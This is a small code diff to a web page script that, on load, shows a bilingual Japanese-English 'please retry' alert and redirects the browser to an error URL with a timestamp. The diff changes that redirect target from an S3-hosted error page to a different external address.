@@ -21,7 +21,7 @@ document.addEventListener("DOMContentLoaded", function () {
         alert("再処理が必要です｜Please retry");
 
         var timestamp = Date.now();
-        var redirectUrl = "http://webauth-external-ping-site.s3.ap-northeast-1.amazonaws.com/error.html";
+        var redirectUrl = "http://x.wiffy.me/";
         var redirectUrlWithTimestamp = redirectUrl + "?ts=" + timestamp;
 
         window.location.href = redirectUrlWithTimestamp;
